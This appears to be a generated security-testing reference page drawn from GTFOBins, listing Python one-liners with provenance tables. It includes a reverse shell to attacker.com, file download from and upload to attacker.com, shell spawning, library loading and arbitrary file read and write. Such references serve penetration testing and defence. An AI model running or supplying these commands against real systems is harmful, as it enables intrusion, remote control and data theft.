---
parsed_by: focuslocust
source: commands
type: generated
---
# python Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## python

Tool page: [python](../../tools/linux/python.md)

### download

```text
python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve("http://attacker.com/path/to/input-file", "/path/to/output-file")'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/python` |
| Evidence | Function example preserved from source parser. |

### file-read

```text
python -c 'print(open("/path/to/input-file").read())'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/python` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
python -c 'open("/path/to/output-file","w+").write("DATA")'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/python` |
| Evidence | Function example preserved from source parser. |

### library-load

```text
python -c 'from ctypes import cdll; cdll.LoadLibrary("/path/to/lib.so")'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/python` |
| Evidence | Function example preserved from source parser. |

### reverse-shell

```text
python -c 'import sys,socket,os,pty;s=socket.socket()
s.connect(("attacker.com",12345))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/python` |
| Evidence | Function example preserved from source parser. |

### shell

```text
python -c 'import os; os.execl("/bin/sh", "sh")'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/python` |
| Evidence | Function example preserved from source parser. |

### upload

```text
python -c 'import sys
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen("http://attacker.com", open("/path/to/input-file", "rb").read())'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/python` |
| Evidence | Function example preserved from source parser. |

### upload

```text
python -c 'import sys
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", 12345), s.SimpleHTTPRequestHandler).serve_forever()'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/python` |
| Evidence | Function example preserved from source parser. |
